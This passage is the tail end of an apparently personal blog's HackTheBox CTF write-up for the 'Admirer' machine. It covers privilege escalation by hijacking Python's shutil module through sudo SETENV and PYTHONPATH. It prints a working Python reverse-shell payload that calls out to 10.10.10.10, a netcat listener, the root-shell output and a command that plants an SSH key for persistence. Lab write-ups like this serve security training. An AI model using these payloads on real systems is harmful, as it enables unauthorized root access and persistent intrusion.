+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">waldo@admirer:~$ sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> waldo:</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> waldo on admirer:</span><br><span class="line">User waldo may run the following commands on admirer:</span><br><span class="line">    (ALL) SETENV: /opt/scripts/admin_tasks.sh</span><br><span class="line">waldo@admirer:~$</span><br></pre></td></tr></table></figure>
+
+<p>Looks like an homemade administration script. If we can find a vulnerability there it’s our way to root.</p>
+<p>Let’s take a look at this script:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">waldo@admirer:~$ cat /opt/scripts/admin_tasks.sh</span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">view_uptime()</span><br><span class="line">&#123;</span><br><span class="line">    /usr/bin/uptime -p</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">view_users()</span><br><span class="line">&#123;</span><br><span class="line">    /usr/bin/w</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">view_crontab()</span><br><span class="line">&#123;</span><br><span class="line">    /usr/bin/crontab -l</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">backup_passwd()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">"<span class="variable">$EUID</span>"</span> -eq 0 ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"Backing up /etc/passwd to /var/backups/passwd.bak..."</span></span><br><span class="line">        /bin/cp /etc/passwd /var/backups/passwd.bak</span><br><span class="line">        /bin/chown root:root /var/backups/passwd.bak</span><br><span class="line">        /bin/chmod 600 /var/backups/passwd.bak</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"Done."</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"Insufficient privileges to perform the selected operation."</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">backup_shadow()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">"<span class="variable">$EUID</span>"</span> -eq 0 ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"Backing up /etc/shadow to /var/backups/shadow.bak..."</span></span><br><span class="line">        /bin/cp /etc/shadow /var/backups/shadow.bak</span><br><span class="line">        /bin/chown root:shadow /var/backups/shadow.bak</span><br><span class="line">        /bin/chmod 600 /var/backups/shadow.bak</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"Done."</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"Insufficient privileges to perform the selected operation."</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">backup_web()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">"<span class="variable">$EUID</span>"</span> -eq 0 ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"Running backup script in the background, it might take a while..."</span></span><br><span class="line">        /opt/scripts/backup.py &amp;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"Insufficient privileges to perform the selected operation."</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">backup_db()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">"<span class="variable">$EUID</span>"</span> -eq 0 ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"Running mysqldump in the background, it may take a while..."</span></span><br><span class="line">        <span class="comment">#/usr/bin/mysqldump -u root admirerdb &gt; /srv/ftp/dump.sql &amp;</span></span><br><span class="line">        /usr/bin/mysqldump -u root admirerdb &gt; /var/backups/dump.sql &amp;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"Insufficient privileges to perform the selected operation."</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
+
+<p>If you noticed, the <code>sudo</code> configuration informs us that environnement variable we set are kept when running <code>sudo /opt/scripts/admin_tasks.sh</code>, thanks to <code>SETENV</code>. At first when seeing this I was thinking we could modify our path to make the script run one of our script named <code>uptime</code> for example (like we did a few time in the past, on <a href="https://hg8.sh/posts/writeup/">Writeup box</a> for example).</p>
+<p>Unfortunately the script author got careful about this and used only absolute path making it impossible for us to use this trick to elevate our privileges.</p>
+<p>Digging a bit more we notice a call to a <code>backup.py</code> script. Let’s take a look:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> shutil <span class="keyword">import</span> make_archive</span><br><span class="line"></span><br><span class="line">src = <span class="string">'/var/www/html/'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># old ftp directory, not used anymore</span></span><br><span class="line"><span class="comment">#dst = '/srv/ftp/html'</span></span><br><span class="line"></span><br><span class="line">dst = <span class="string">'/var/backups/html'</span></span><br><span class="line"></span><br><span class="line">make_archive(dst, <span class="string">'gztar'</span>, src)</span><br></pre></td></tr></table></figure>
+
+<p>That’s interesting, what if we keep our idea of PATH hijaking and apply it to Python library <code>shutil</code>? </p>
+<p>As far as I know when importing a library (<code>from shutil import make_archive</code>), Python looks in a defined folder to find the library files. Maybe it’s possible to ask Python to search for libraries in a folder we control and inject a rogue library ? Since <code>backup.py</code> is run as <code>root</code> we could achieve privilege escalation. </p>
+<h3 id="Hijacking-Python-shutil-module"><a href="#Hijacking-Python-shutil-module" class="headerlink" title="Hijacking Python shutil module"></a>Hijacking Python shutil module</h3><p>Looking through the <a href="https://docs.python.org/3/using/cmdline.html" target="_blank" rel="noopener">Python Documentation</a> we quickly find what we are looking for:</p>
+<blockquote>
+<p>PYTHONPATH is an environment variable which you can set to add additional directories where python will look for modules and packages. For most installations, you should not set these variables since they are not needed for Python to run. Python knows where to find its standard library.</p>
+<p>The only reason to set PYTHONPATH is to maintain directories of custom Python libraries that you do not want to install in the global default location (i.e., the site-packages directory).</p>
+<p><a href="https://docs.python.org/3/using/cmdline.html#envvar-PYTHONPATH" target="_blank" rel="noopener">https://docs.python.org/3/using/cmdline.html#envvar-PYTHONPATH</a></p>
+</blockquote>
+<p>To put that in practice, first let’s write a very simple python script as <code>shutil</code> <code>make_archive</code> function to open a reverse shell:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_archive</span><span class="params">(arg1, arg2, arg3)</span>:</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((<span class="string">"10.10.10.10"</span>, <span class="number">8585</span>))</span><br><span class="line">    os.dup2(s.fileno(), <span class="number">0</span>)</span><br><span class="line">    os.dup2(s.fileno(), <span class="number">1</span>)</span><br><span class="line">    os.dup2(s.fileno(), <span class="number">2</span>)</span><br><span class="line">    p = subprocess.call([<span class="string">"/bin/sh"</span>, <span class="string">"-i"</span>])</span><br></pre></td></tr></table></figure>
+
+<p>Let’s save it to a folder we control with <code>shutil.py</code> as name. I will use <code>/tmp/.hg8/shutil.py</code>.</p>
+<p>Now we open our listener:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure>
+
+<p>And finally we run the backup script as <code>root</code> while setting the <code>PYTHONPATH</code> environnement variable to point to our rogue library in <code>/tmp/.hg8/</code> first, then to the real lib directory to make sure the library used by our reverse shell can work properly:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">waldo@admirer:~$ sudo PYTHONPATH=/tmp/.hg8:/usr/lib/python3.5/ /opt/scripts/admin_tasks.sh 6</span><br><span class="line">waldo@admirer:~$</span><br></pre></td></tr></table></figure>
+
+<p>And we get a new connection on our listener:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.187:44040</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>
+
+<p>Let’s add our SSH key to <code>~/.ssh/authorized_keys</code> in order to get a proper shell: </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir /root/.ssh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"ssh-rsa AAAxxxx hg8@htb.htb"</span> &gt;&gt; ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
+
+<p>And grab our flag:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh -i id_rsa_htb root@admirer.htb</span><br><span class="line">Linux admirer 4.9.0-12-amd64 x86_64 GNU/Linux</span><br><span class="line"></span><br><span class="line">Last login: Wed Apr 29 11:07:00 2020</span><br><span class="line">root@admirer:~<span class="comment"># cat root.txt</span></span><br><span class="line">bxxxxxxxxxxxxxxxxxxx0</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>That’s it folks! As always do not hesitate to contact me for any questions or feedbacks!</p>
+<p>See you next time ;)</p>
+<p>-hg8</p>
+
+  </div>
+</article>
+<br>
+<br>
+
+
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a> › <a class="category-link" href="/categories/CTF/HackTheBox/">HackTheBox</a> › <a class="category-link" href="/categories/CTF/HackTheBox/Easy-Box/">Easy Box</a>
+    </div>
+
+
+
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/adminer/" rel="tag">adminer</a>, <a class="tag-link" href="/tags/admirer/" rel="tag">admirer</a>, <a class="tag-link" href="/tags/enumeration/" rel="tag">enumeration</a>, <a class="tag-link" href="/tags/ftp/" rel="tag">ftp</a>, <a class="tag-link" href="/tags/linux/" rel="tag">linux</a>, <a class="tag-link" href="/tags/mysql-local-file-read/" rel="tag">mysql local file read</a>, <a class="tag-link" href="/tags/python-library-overwrite/" rel="tag">python library overwrite</a>
+    </div>
+
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Posts</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Flag"><span class="toc-number">1.</span> <span class="toc-text">User Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Credentials-txt"><span class="toc-number">1.2.</span> <span class="toc-text">Credentials.txt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Admirer-app-backup"><span class="toc-number">1.3.</span> <span class="toc-text">Admirer app backup</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Adminer-Database-management-tool"><span class="toc-number">1.4.</span> <span class="toc-text">Adminer Database management tool.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL-Local-file-read-gt-waldo"><span class="toc-number">1.5.</span> <span class="toc-text">MySQL Local file read -&gt; waldo</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-Flag"><span class="toc-number">2.</span> <span class="toc-text">Root Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon-1"><span class="toc-number">2.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hijacking-Python-shutil-module"><span class="toc-number">2.2.</span> <span class="toc-text">Hijacking Python shutil module</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020
+    <a href="https://hg8.sh">hg8.sh</a>
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/atom.xml">RSS</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+    
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+
+
+
+</body>
+</html>
